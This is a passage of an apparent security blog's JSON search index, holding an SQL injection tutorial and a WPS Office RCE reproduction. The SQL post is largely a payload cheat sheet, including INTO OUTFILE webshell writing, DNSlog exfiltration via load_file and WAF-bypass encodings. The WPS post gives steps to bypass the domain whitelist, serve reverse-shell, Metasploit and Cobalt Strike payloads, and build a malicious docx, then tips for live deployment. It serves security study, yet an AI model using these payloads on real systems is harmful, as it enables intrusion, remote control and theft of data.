;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"XSS","permalink":"https://www.ixxzhi.cn/tags/XSS/"}]},{"title":"SQL注入漏洞","slug":"SQL注入漏洞","date":"2023-08-19T15:02:38.000Z","updated":"2023-08-19T16:37:36.347Z","comments":true,"path":"2023/08/19/SQL注入漏洞/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/19/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"SQL注入简介 SQL注入原理 ​ SQL注入就是指web应用程序对用户输入的数据合法性没有过滤或者判断，前端传入的参数是攻击这可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的SQL语句来实现对数据库的任意操作。","text":"SQL注入简介 SQL注入原理 ​ SQL注入就是指web应用程序对用户输入的数据合法性没有过滤或者判断，前端传入的参数是攻击这可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的SQL语句来实现对数据库的任意操作。 SQL注入的危害 数据库信息泄露 网页篡改：通过操作数据库对特定网页进行篡改，嵌入网码链接，进行挂马攻击。 数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被更改。 服务器被远程控制：黑客可以修改或控制操作系统。 种植木马：瘫痪全系统。 SQL注入常见攻击流程 判断是否存在注入 收集信息，判断数据库类型、版本 根据注入类型爆破库名，表名等 获取账号密码，上传文件 常用函数 version() mysql版本 database() 数据库名 current_user() 当前用户名 @@datadir 数据库路径 @@basedir 数据库安装路径 注释 –空格 或者 –+（空格可以使用+代替（url编码%23表示注释）） &#x2F;**&#x2F; SQL注入类型 联合查询注入 使用条件 当查询的数据会回显到页面时使用 注入过程 order by 1-99 判断数据库表的字段数 123?id=1 order by 7报错?id=1 order by 6不报错--&gt; 则字段数为6 union select 1,2,3,4,5,6 判断数据库表中哪些字段会回显 1234?id=-1 union select 1,2,3,4,5,6看到某个数字回显则在该位置进行查询假设回显4和6回显则可在4和6的位置进行查询 爆库名database() version() user() 等 1?id=-1 union select 1,2,3,database(),5,version() 爆表名 1?id=-1 union select 1,2,3,group_concat(table_name),4,5,6 from information_schema.tables where table_schema=database() 爆字段 1?id=-1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27;; 爆数据 1?id=? union select 1,2,3,concat(id,password),5,6 from test.users limit 0,1; 高权限跨库注入 1?id=-1 union select 1,2,3,concat(schema_name),5,6 from information_schema.schemata; 1?id=-1 union select 1,2,3,concat(table_name),5,6 from information_schema.columns where table_schema=&#x27;mysql&#x27;; 报错注入 在MySQL中使用一些指定的函数来制造报错，后台没有屏蔽数据库报错信息，在语法发生错误时会输出在前端，从而从报错信息中获取设定的信息，select&#x2F;insert&#x2F;update&#x2F;delete都可以使用报错来获取信息。 使用条件 后台没有屏蔽数据库报错信息 常用函数 extractvalue() ,updatexml() , exp() ,floor() extractvalue(XML_document,XPath_string) MySQL对XML文档数据进行查询的XPATH函数 XML_document：为XML文档对象的名称 XPATH_string：XPATH格式的字符串 updatexml(XML_document, XPath_string, new_value) MySQL对XML文档数据进行查询和修改的XPATH函数 XML_document：XML文档对象的名称 Xpath_string：XPATH格式的字符串 new_value：替换查找到的符合条件的数据 payload extractvalue() 1extractvlaue(1,concat(0x7e,select database(),0x7e)) updatexml() 1updatexml(1,concat(0x7e,select database(),0x7e),1) 完整的语句 1?id=1 and updatexml(1,concat(0x7e,select database(),0x7e),1) --+ 布尔盲注 ​ 有些情况下，开发人员屏蔽了报错信息，导致攻击者无法通过报错信息进行注入的判断。这种情况下的注入称为盲注。 ​ 盲注根据展现方式，分为Boolean型盲注和时间型盲注。 ​ Boolean是基于真假的判断(True or False);不管输入什么，结果都只返回真或假两种情况，通过and 1=1 和 and 1=2 可以发现注入点。 ​ Boolean型盲注的关键在于通过表达式结果与已知值进行比对，根据比对结果判断正确与否。 多种格式在线加密解密 - ASCII\\十进制\\十六进制\\二进制在线转换工具 (woj.app) 常用函数 通过长度判断 length()：length(database())&gt;&#x3D;20 通过字符判断 substr()：substr(database(),1,1)&#x3D;’s’ 通过ascii码判断：ascii(substr(database(),1,1))&#x3D;117 payload 判断数据库长度 1length(database())&gt;=1 截取数据库的第一个字符 1substr(database(),1,1)=&#x27;s&#x27; 把截取的字符转换成ASCII 1ascii(substr(database(),1,1))=110 完整的语句 1?id=1 and ascii(substr(select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=1 --+ 时间盲注 ​ 代码存在SQL注入漏洞，然而页面既不会回显数据，也不会回显错误信息，语句执行后也不提示真假，我们不能通过页面内容来判断。这里我们就可以通过构造语句，通过页面响应的时长，来判断信息，这就是时间盲注。 原理 利用sleep()或benchmark()等函数让MySQL执行时间变长。经常与if(exp1,exp2,exp3)语句结合使用，通过页面的响应时间来判断条件是否正确。 常用函数 sleep(),benchmark()延迟函数 if(exp1,exp2,exp3)：exp1&#x3D;&#x3D;true?exp2:exp3; payload sleep() 1?id=1 and sleep(5) --+ if() 123if(length(database())&gt;=4,sleep(5),1)if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)if(ascii(substr(database(),1,1))=117,sleep(5),1) 完整的语句 1?id=1 and if(ascii(substr(database(),1,1))=117,sleep(5),1) 堆叠注入 在SQL中，分号 ; 是用来表示一条SQL语句的结束。在结束一个SQL语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而联合注入也是将两条语句合并在一起，两者之间的区别在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行任意语句。 使用条件 当使用mysql_multi_query()函数时，支持多条sql语句一起执行。一般使用mysqli_query()函数 使用PDO预编译时 ​ PHP里面的PDO就是一个PHP语言的一个类，使用PDO对象连接数据库，就是在PHP中使用这个PDO类创建出来的一个对象，然后通过这个创建出来的对象来调用PDO类里面的各种各样的方法实现数据库的各种操作，而PDO这个类中的一些方法就可以进行一些字符的过滤保证安全性。 堆叠注入和联合注入的区别 union后只能跟select，而堆叠后面可以使用insert，update，create，delete等常规数据库语句。 payload insert into 1?id=1; insert into users(id,username,password) values(&#x27;100&#x27;,&#x27;qqqq&#x27;,&#x27;23333&#x27;)--+ 二次注入 ​ 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了sql注入。 步骤 插入恶意数据 ​ 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 引用恶意数据 ​ 开发者默认存入数据库的数据是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验处理。 宽字节注入 ​ 一个gbk汉字占两个字节，第一个字节(129-254)，第二个字节(64-254)，当设置gbk编码后，遇到连续两个字节都符合gbk取值范围时会自动解析为一个汉字，从而把转义字符 \\ 抵消掉。 header头部注入 cookie： ​ 通过cookie传输数据或cookie的值会拼接到SQL语句中 User-Agent ​ User-Agent的数据会拼接到SQL语句中 referer ​ referer的值会拼接到SQL语句中 高权限读写操作 条件 需要用户有读写权限 需要知道网站的绝对路径 secure_file_priv&#x3D;””需要配置 常用函数 写：into outfile 读：load_file() payload into outfile 123?id=1 union select 1,2,&#x27;&lt;&gt;&#x27;,4,5 into outfile &quot;C:\\\\phpstudy\\\\www\\\\a.php&quot;--+#蚁剑https://www.yuque.com/antswordproject/antsword/wy7mqg load_file 1?id=-1 &#x27;union select 1,2,load_file(&quot;C:\\\\phpstudy\\\\www\\\\a.php&quot;),4,5--+ DNSlog注入 条件 需要有文件读写权限 在my.ini文件中添加或修改为 secure_file_oriv= DNSlog平台 http://www.dnslog.cn http://ceye.io https://github.com/bugscanteam/dnslog/ 注入过程 打开DNSlog平台获取到子域名 尝试外带sql记录 1?id=1 and load_file(concat(&quot;\\\\\\\\&quot;,version(),&quot;.yn3pf3.dnslog.cn\\\\yyyy&quot;)) --+ 执行sql语句查询第一张表 1?id=1 and load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),&quot;.dmgdyv.dnslog.cn\\\\yyyy&quot;)) --+ SQL注入绕过 注释绕过 1234561. --+2. #3. /**/4. /*!union*/5. /*!422444union*/ /*!50010select*/案例 union /*!union*/ 1,2,3 大小写绕过 1Union Select 双写绕过 123union selselectect 1,2,3aandndoorr 编码绕过 十六进制编码 1select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 ascii编码 1select * from users where id=CHAR(49) unicode编码 1234单引号：%u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27空格：%u0020 %uff00 %c0%20 %c0%a0 %e0%80%左括号：%u0028 %uff08 %c0%28 %c0%a8 %e0%80%右括号：%u0029 %uff09 %c0%29 %c0%a9 %e0%80% 空格过滤绕过 1234/**/()回车：%0a%20 %09 %0b %0c %0d %a0 %00 /**/ /*!*/ or或and绕过 12345and = &amp;&amp;or = ||xor = |not = !select * from users where id=1 &amp;&amp; username=&#x27;Dumb&#x27; 等号绕过 like替换 1select * from users where username like &quot;admin&quot; rlike：模糊匹配 1select * from users where username rlike &quot;ad&quot; regixp：正则匹配 1select * from users where username regexp &quot;admin3&quot; 大小写符号绕过 1select * from users where username&gt;&#x27;admin&#x27; and username&lt;&#x27;admin3&#x27; &lt;&gt;等价于！&#x3D;，再取反就是等号 1select * from users where !(username&lt;&gt; &#x27;admin&#x27;) 大于小于符号绕过 1234567greatest(n1,n2,n3...)返回最大值greatest(ascii(substr(str,1,1)),1) = 98least(n1,n2,n3...)返回最小值substr(str,1,1) in (&#x27;a&#x27;)between a and band substr(str,1,1) between &#x27;a&#x27; and &#x27;d&#x27;select substr(&#x27;xc&#x27;,2,1) between &#x27;a&#x27; and &#x27;d&#x27; 宽字节绕过 1id=1%df&#x27; 逗号绕过 123mid(str,1,1) 等于mid（str from 1 for 1)substr(str,1,1) 等于 substr(str from 1 for 1)select * from users limit 0,1 等于limit 1 offset 1 等价函数替换 123sleep() --&gt; benchmark()ascii() --&gt; hex(),bin()group_concat() --&gt; concat_ws()","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.ixxzhi.cn/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"WPS_RCE漏洞复现","slug":"WPS-RCE漏洞复现","date":"2023-08-15T08:52:38.000Z","updated":"2023-09-01T14:55:38.532Z","comments":true,"path":"2023/08/15/WPS-RCE漏洞复现/","link":"","permalink":"https://www.ixxzhi.cn/2023/08/15/WPS-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"漏洞介绍 漏洞名称：WPS远程命令执行漏洞 漏洞编号：暂无 影响版本： WPS Office 2023 个人版 &lt; 11.1.0.15120 WPS Office 2019 企业版 &lt; 11.8.2.12085","text":"漏洞介绍 漏洞名称：WPS远程命令执行漏洞 漏洞编号：暂无 影响版本： WPS Office 2023 个人版 &lt; 11.1.0.15120 WPS Office 2019 企业版 &lt; 11.8.2.12085 什么是WebExtension？ Office中的WebExtension（通常称为Office插件或Office应用程序）是一种用于扩展Microsoft Office功能的技术。Office插件使第三方开发者能够在Office应用程序中集成自己的服务和功能。这些插件采用跨平台的Web技术（如HTML、CSS和JavaScript）开发，可以在不同的平台和设备上运行。 简单理解就是Office内置了一个浏览器，可以解析html&#x2F;javascript&#x2F;css 代码 本次的漏洞就是WPS在处理WebExtension时，未能正确的处理javascript代码，造成了溢出RCE。 漏洞利于限制 购买***wps.cn的域名 既然是有WebExtension中的JavaScript造成的，那么就需要准备对应的html文件，WebExtension支持从第三方网站加载html，所以需要在公网开启web服务，用来共享html文件。 由于wps的限制，当我们加载第三方网站的html时，wps会进行提醒，大概如下面图片。 在WPS中，wps.cn的域名是在白名单中的，只要我们加载的资源在wps.cn的网站中就不会有这个提示。但是我们无法控制wps.cn。 在wps中，白名单检测存在漏洞，我们只需要把html文件放在xxxwps.cn的网站中就不会有提示。 因此，想要利用这个漏洞，必须要购买一个域名，域名中只需要包含wps.cn即可。 部署html文件到vps上，需要把域名绑定到vps 购买域名和vps后，需要把子域名 clientweb.docer.wps.cn.***wps.cn 解析到购买的vps上，尽量套一层cdn，再使用nginx反向代理到搭建的服务上。 这里的子域名必须为 clientweb.docer.wps.cn.***wps.cn，不然无法过白名单。 来源：https://github.com/ba0gu0/wps-rce 本地复现 克隆项目 1git clone https://github.com/ba0gu0/wps_rce 安装对应的依赖 python &gt;&#x3D; 3.8 12cd wps_rcepip install -r requirement.txt -i https://pypi.tuna.tsinghua.edu.cn/simple 修改hosts文件 以管理员身份运行记事本 文件-打开C:\\Windows\\System32\\drivers\\etc\\hosts 添加以下字符串并保存 1127.0.0.1 clientweb.docer.wps.cn.xxxwps.cn 启动服务端 1python server/main.py 此脚本的作用是用来生成html代码，同时还支持生成shell、msf、cs反弹的代码。 直接访问域名解析的地址，或者vps的端口 此服务端基于网上公开的poc进行开发，访问对应的地址，可以直接生成对应程序的利用代码。 url对应cs和msf的payload列表 url地址 平台 payload &#x2F;calc 无 执行calc命令 &#x2F;shell&#x2F;1.1.1.1&#x2F;9000 all 服务器监听：nc -lnvp 9000 &#x2F;msf&#x2F;tcp&#x2F;1.1.1.1&#x2F;9000 msf windows&#x2F;meterpreter&#x2F;reverse_tcp &#x2F;msf&#x2F;http&#x2F;1.1.1.1&#x2F;80 msf windows&#x2F;meterpreter&#x2F;reverse_http &#x2F;msf&#x2F;https&#x2F;1.1.1.1&#x2F;443 msf windows&#x2F;meterpreter&#x2F;reverse_https &#x2F;cs&#x2F;http&#x2F;1.1.1.1&#x2F;80 cs Beacon http &#x2F;cs&#x2F;https&#x2F;1.1.1.1&#x2F;443 cs Beacon https &#x2F;shellcode&#x2F;base64_shellcode 无 任意的windows可用的shellcode，需要进行base64编码 生成恶意文件 准备一个test.docx文件放到client文件夹下 执行如下命令 12cd clientpython main.py test.docx http://clientweb.docer.wps.cn.xxxwps.cn/calc 新生成的docx文件便为含恶意代码的docx文件 使用wps打开该文件，自动弹出计算器 利用 如有**wps.cn此类的域名则可以在vps上面启动server端，并把clientweb.docer.wps.cn.**wps.cn解析到vps的IP上面，省去上述修改hosts文件的步骤就可以啦~~","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"},{"name":"WPS","slug":"WPS","permalink":"https://www.ixxzhi.cn/tags/WPS/"}]}],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"个人笔记","slug":"个人笔记","permalink":"https://www.ixxzhi.cn/categories/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"},{"name":"实战笔记","slug":"实战笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"收集汇总","slug":"收集汇总","permalink":"https://www.ixxzhi.cn/categories/%E6%94%B6%E9%9B%86%E6%B1%87%E6%80%BB/"},{"name":"信息收集","slug":"信息收集","permalink":"https://www.ixxzhi.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"方法总结","slug":"方法总结","permalink":"https://www.ixxzhi.cn/categories/%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"},{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://www.ixxzhi.cn/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.ixxzhi.cn/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"},{"name":"免杀","slug":"免杀","permalink":"https://www.ixxzhi.cn/tags/%E5%85%8D%E6%9D%80/"},{"name":"shellcode","slug":"shellcode","permalink":"https://www.ixxzhi.cn/tags/shellcode/"},{"name":"C/C++","slug":"C-C","permalink":"https://www.ixxzhi.cn/tags/C-C/"},{"name":"网络协议","slug":"网络协议","permalink":"https://www.ixxzhi.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"TCP","slug":"TCP","permalink":"https://www.ixxzhi.cn/tags/TCP/"},{"name":"DNS","slug":"DNS","permalink":"https://www.ixxzhi.cn/tags/DNS/"},{"name":"内网","slug":"内网","permalink":"https://www.ixxzhi.cn/tags/%E5%86%85%E7%BD%91/"},{"name":"面试","slug":"面试","permalink":"https://www.ixxzhi.cn/tags/%E9%9D%A2%E8%AF%95/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://www.ixxzhi.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"yakLang","slug":"yakLang","permalink":"https://www.ixxzhi.cn/tags/yakLang/"},{"name":"RCE","slug":"RCE","permalink":"https://www.ixxzhi.cn/tags/RCE/"},{"name":"WinRAR","slug":"WinRAR","permalink":"https://www.ixxzhi.cn/tags/WinRAR/"},{"name":"企业微信","slug":"企业微信","permalink":"https://www.ixxzhi.cn/tags/%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1/"},{"name":"Typora","slug":"Typora","permalink":"https://www.ixxzhi.cn/tags/Typora/"},{"name":"QQ","slug":"QQ","permalink":"https://www.ixxzhi.cn/tags/QQ/"},{"name":"常用工具","slug":"常用工具","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"name":"工具","slug":"工具","permalink":"https://www.ixxzhi.cn/tags/%E5%B7%A5%E5%85%B7/"},{"name":"提权","slug":"提权","permalink":"https://www.ixxzhi.cn/tags/%E6%8F%90%E6%9D%83/"},{"name":"常见Web漏洞","slug":"常见Web漏洞","permalink":"https://www.ixxzhi.cn/tags/%E5%B8%B8%E8%A7%81Web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化","slug":"反序列化","permalink":"https://www.ixxzhi.cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"XXE","slug":"XXE","permalink":"https://www.ixxzhi.cn/tags/XXE/"},{"name":"XSS","slug":"XSS","permalink":"https://www.ixxzhi.cn/tags/XSS/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://www.ixxzhi.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"WPS","slug":"WPS","permalink":"https://www.ixxzhi.cn/tags/WPS/"}]}